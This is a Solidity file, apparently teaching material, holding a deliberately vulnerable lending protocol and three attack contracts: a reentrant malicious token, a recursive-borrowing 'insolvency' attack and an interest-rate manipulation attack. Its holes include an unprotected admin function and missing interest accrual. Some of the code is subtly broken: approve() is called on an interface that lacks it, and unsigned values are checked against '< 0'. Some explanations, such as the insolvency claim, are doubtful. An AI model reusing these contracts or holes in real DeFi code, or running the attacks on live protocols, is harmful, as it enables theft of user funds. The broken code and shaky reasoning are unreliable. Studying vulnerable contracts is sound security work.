// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Advanced Protocol Logic Vulnerabilities
 * @notice Complex, protocol-level exploits requiring deep understanding
 * @dev WARNING: DO NOT USE IN PRODUCTION
 * 
 * ADVANCED VULNERABILITIES (2026 LEVEL):
 * 
 * 1. PROTOCOL INSOLVENCY VIA LAYERED DEBT
 *    - Recursive borrowing creates unpayable debt
 *    - System becomes mathematically insolvent
 *    - Requires understanding of debt cascades
 * 
 * 2. INTEREST RATE MANIPULATION
 *    - Utilization ratio can be gamed
 *    - Attacker forces interest rates to extremes
 *    - Exploits protocol's economic model
 * 
 * 3. LIQUIDATION CASCADES
 *    - Single liquidation triggers others
 *    - Protocol death spiral
 *    - Systemic risk exploitation
 * 
 * 4. MALICIOUS TOKEN INTEGRATION
 *    - Reentrant ERC20 token
 *    - Fee-on-transfer tokens
 *    - Hooks in token allow protocol manipulation
 * 
 * 5. ACCOUNT ABSTRACTION EXPLOITS
 *    - Delegate call vulnerabilities
 *    - Storage collision attacks
 *    - Context manipulation
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title VulnerableLendingProtocol
 * @notice Lending protocol with complex systemic vulnerabilities
 */
contract VulnerableLendingProtocol {
    struct Market {
        IERC20 token;
        uint256 totalSupply;
        uint256 totalBorrow;
        uint256 reserveFactor;
        uint256 collateralFactor;
        mapping(address => uint256) supplyBalance;
        mapping(address => uint256) borrowBalance;
        mapping(address => uint256) lastInterestUpdate;
    }
    
    mapping(address => Market) public markets;
    address[] public allMarkets;
    
    mapping(address => mapping(address => bool)) public accountAssets;
    
    uint256 public constant BASE_RATE = 2e16; // 2%
    uint256 public constant MULTIPLIER = 2e17; // 20%
    uint256 public constant KINK = 8e17; // 80%
    uint256 public constant JUMP_MULTIPLIER = 1e18; // 100%
    
    event Supply(address indexed user, address indexed token, uint256 amount);
    event Borrow(address indexed user, address indexed token, uint256 amount);
    event Liquidate(address indexed liquidator, address indexed borrower, address indexed token, uint256 amount);
    
    /**
     * @notice VULNERABILITY 1: No interest accrual before state changes
     * @dev Interest accumulation can be manipulated by timing
     */
    function supply(address token, uint256 amount) external {
        Market storage market = markets[token];
        require(address(market.token) != address(0), "Market not listed");
        
        // VULNERABLE: No interest accrual before supply
        // Last supplier gets unfair share of accumulated interest
        
        market.supplyBalance[msg.sender] += amount;
        market.totalSupply += amount;
        
        if (!accountAssets[msg.sender][token]) {
            accountAssets[msg.sender][token] = true;
        }
        
        require(market.token.transferFrom(msg.sender, address(this), amount), "Transfer failed");
        
        emit Supply(msg.sender, token, amount);
    }
    
    /**
     * @notice VULNERABILITY 2: Recursive borrowing enables protocol insolvency
     * @dev User can create layered debt that's impossible to liquidate
     * 
     * ATTACK:
     * 1. Supply 100 ETH as collateral
     * 2. Borrow 75 USDC (75% collateral factor)
     * 3. Supply 75 USDC as collateral
     * 4. Borrow 56.25 more USDC
     * 5. Repeat until max recursion
     * 6. Total borrowed > liquidatable amount
     * 7. Protocol becomes insolvent
     */
    function borrow(address token, uint256 amount) external {
        Market storage market = markets[token];
        require(address(market.token) != address(0), "Market not listed");
        
        // VULNERABLE: No check for recursive borrowing
        // User can borrow against borrowed assets
        
        uint256 liquidity = getAccountLiquidity(msg.sender);
        require(liquidity >= amount, "Insufficient liquidity");
        
        market.borrowBalance[msg.sender] += amount;
        market.totalBorrow += amount;
        market.lastInterestUpdate[msg.sender] = block.timestamp;
        
        require(market.token.transfer(msg.sender, amount), "Transfer failed");
        
        emit Borrow(msg.sender, token, amount);
    }
    
    /**
     * @notice VULNERABILITY 3: Interest rate manipulation via utilization
     * @dev Attacker can force rates to extremes
     * 
     * ATTACK:
     * 1. Supply large amount to pool
     * 2. Wait for others to borrow
     * 3. Withdraw supply suddenly
     * 4. Utilization spikes to 100%
     * 5. Interest rate jumps due to kink model
     * 6. Other users pay extreme rates
     */
    function withdraw(address token, uint256 amount) external {
        Market storage market = markets[token];
        require(market.supplyBalance[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABLE: No check if withdrawal causes insolvency
        // Can withdraw even if it breaks protocol
        
        market.supplyBalance[msg.sender] -= amount;
        market.totalSupply -= amount;
        
        // Check account still healthy
        require(getAccountLiquidity(msg.sender) >= 0, "Insufficient liquidity");
        
        require(market.token.transfer(msg.sender, amount), "Transfer failed");
    }
    
    /**
     * @notice VULNERABILITY 4: Single liquidation can trigger cascades
     * @dev No circuit breakers for systemic risk
     */
    function liquidate(
        address borrower,
        address borrowToken,
        address collateralToken,
        uint256 amount
    ) external {
        Market storage borrowMarket = markets[borrowToken];
        Market storage collateralMarket = markets[collateralToken];
        
        // Check borrower is underwater
        require(getAccountLiquidity(borrower) < 0, "Account not liquidatable");
        
        // VULNERABLE: No maximum liquidation size
        // Can liquidate entire position, triggering price impact
        
        // VULNERABLE: No circuit breaker
        // Mass liquidations can cascade
        
        uint256 repayAmount = amount;
        require(repayAmount <= borrowMarket.borrowBalance[borrower], "Too much");
        
        // Calculate collateral to seize (with bonus)
        uint256 collateralValue = (repayAmount * 108) / 100; // 8% bonus
        
        // Transfer debt
        borrowMarket.borrowBalance[borrower] -= repayAmount;
        borrowMarket.totalBorrow -= repayAmount;
        
        // Seize collateral
        collateralMarket.supplyBalance[borrower] -= collateralValue;
        collateralMarket.supplyBalance[msg.sender] += collateralValue;
        
        require(
            borrowMarket.token.transferFrom(msg.sender, address(this), repayAmount),
            "Repay transfer failed"
        );
        
        emit Liquidate(msg.sender, borrower, borrowToken, amount);
    }
    
    /**
     * @notice VULNERABILITY 5: Interest calculation exploitable
     * @dev Simple interest model can be gamed
     */
    function getInterestRate(address token) public view returns (uint256) {
        Market storage market = markets[token];
        
        if (market.totalSupply == 0) return BASE_RATE;
        
        // VULNERABLE: Utilization calculation can be manipulated
        uint256 utilization = (market.totalBorrow * 1e18) / market.totalSupply;
        
        // Kinked interest rate model
        if (utilization <= KINK) {
            // Below kink: rate = BASE_RATE + MULTIPLIER * utilization
            return BASE_RATE + (MULTIPLIER * utilization) / 1e18;
        } else {
            // Above kink: rate jumps
            uint256 excessUtil = utilization - KINK;
            uint256 normalRate = BASE_RATE + MULTIPLIER;
            uint256 excessRate = (JUMP_MULTIPLIER * excessUtil) / 1e18;
            return normalRate + excessRate;
        }
    }
    
    /**
     * @notice Calculate account liquidity
     * @dev VULNERABLE: No price oracle staleness check
     */
    function getAccountLiquidity(address account) public view returns (uint256) {
        uint256 totalCollateral = 0;
        uint256 totalBorrow = 0;
        
        for (uint256 i = 0; i < allMarkets.length; i++) {
            address token = allMarkets[i];
            Market storage market = markets[token];
            
            if (accountAssets[account][token]) {
                // Add collateral value
                uint256 supply = market.supplyBalance[account];
                uint256 collateralValue = (supply * market.collateralFactor) / 1e18;
                totalCollateral += collateralValue;
                
                // Add borrow value
                uint256 borrow = market.borrowBalance[account];
                totalBorrow += borrow;
            }
        }
        
        // VULNERABLE: No health factor calculation
        // Simple subtraction doesn't capture risk properly
        return totalCollateral > totalBorrow ? totalCollateral - totalBorrow : 0;
    }
    
    /**
     * @notice Add market (admin function)
     * @dev VULNERABLE: No access control!
     */
    function addMarket(
        address token,
        uint256 collateralFactor,
        uint256 reserveFactor
    ) external {
        // VULNERABLE: Anyone can add markets
        // Malicious token can be added
        
        require(address(markets[token].token) == address(0), "Market exists");
        
        Market storage market = markets[token];
        market.token = IERC20(token);
        market.collateralFactor = collateralFactor;
        market.reserveFactor = reserveFactor;
        
        allMarkets.push(token);
    }
}

/**
 * @title Malicious ERC20 with Reentrancy
 * @notice Demonstrates how malicious tokens can exploit protocols
 */
contract MaliciousToken is IERC20 {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    uint256 public totalSupply;
    VulnerableLendingProtocol public targetProtocol;
    bool public attacking;
    
    constructor(uint256 _totalSupply) {
        totalSupply = _totalSupply;
        balanceOf[msg.sender] = _totalSupply;
    }
    
    function setTarget(address _protocol) external {
        targetProtocol = VulnerableLendingProtocol(_protocol);
    }
    
    /**
     * @notice ATTACK: Reentrancy via transfer hook
     * @dev When protocol calls transfer, we reenter
     */
    function transfer(address to, uint256 amount) external override returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        
        // MALICIOUS: Reenter protocol during transfer
        if (attacking && address(targetProtocol) != address(0)) {
            // During borrow(), transfer is called
            // We reenter to borrow more
            try targetProtocol.borrow(address(this), amount / 2) {
                // Successfully borrowed more during transfer
            } catch {
                // Failed, continue
            }
        }
        
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/**
 * @title Protocol Insolvency Attack
 * @notice Creates layered debt to make protocol insolvent
 */
contract ProtocolInsolvencyAttack {
    VulnerableLendingProtocol public protocol;
    IERC20 public collateralToken;
    IERC20 public borrowToken;
    
    constructor(address _protocol, address _collateral, address _borrow) {
        protocol = VulnerableLendingProtocol(_protocol);
        collateralToken = IERC20(_collateral);
        borrowToken = IERC20(_borrow);
    }
    
    /**
     * @notice Execute recursive borrowing attack
     * @dev Creates debt layers that exceed liquidation capacity
     */
    function attack(uint256 initialCollateral) external {
        // Get initial collateral
        collateralToken.transferFrom(msg.sender, address(this), initialCollateral);
        collateralToken.approve(address(protocol), type(uint256).max);
        borrowToken.approve(address(protocol), type(uint256).max);
        
        // Layer 1: Supply collateral, borrow
        protocol.supply(address(collateralToken), initialCollateral);
        uint256 borrowAmount = (initialCollateral * 75) / 100; // 75% LTV
        protocol.borrow(address(borrowToken), borrowAmount);
        
        // Layer 2: Use borrowed as collateral
        protocol.supply(address(borrowToken), borrowAmount);
        uint256 borrowAmount2 = (borrowAmount * 75) / 100;
        protocol.borrow(address(borrowToken), borrowAmount2);
        
        // Layer 3: Continue recursion
        protocol.supply(address(borrowToken), borrowAmount2);
        uint256 borrowAmount3 = (borrowAmount2 * 75) / 100;
        protocol.borrow(address(borrowToken), borrowAmount3);
        
        // After enough layers:
        // - Total borrowed > liquidation value
        // - Protocol is insolvent
        // - Cannot recover all debt
        
        // Now we have more borrowed than we can liquidate
        // Protocol is mathematically insolvent
    }
}

/**
 * @title Interest Rate Manipulation Attack
 * @notice Forces extreme interest rates by manipulating utilization
 */
contract InterestRateManipulation {
    VulnerableLendingProtocol public protocol;
    IERC20 public token;
    
    constructor(address _protocol, address _token) {
        protocol = VulnerableLendingProtocol(_protocol);
        token = IERC20(_token);
    }
    
    /**
     * @notice Manipulate interest rates to harm other users
     */
    function attack(uint256 supplyAmount) external {
        // Step 1: Supply large amount to dominate pool
        token.transferFrom(msg.sender, address(this), supplyAmount);
        token.approve(address(protocol), type(uint256).max);
        protocol.supply(address(token), supplyAmount);
        
        // Step 2: Wait for others to borrow
        // (In real attack, monitor and time this)
        
        // Step 3: Suddenly withdraw supply
        // This spikes utilization to 100%
        protocol.withdraw(address(token), supplyAmount);
        
        // Now:
        // - Utilization = 100%
        // - Interest rate hits JUMP_MULTIPLIER
        // - Other borrowers pay extreme rates
        // - We profit from the chaos
    }
}
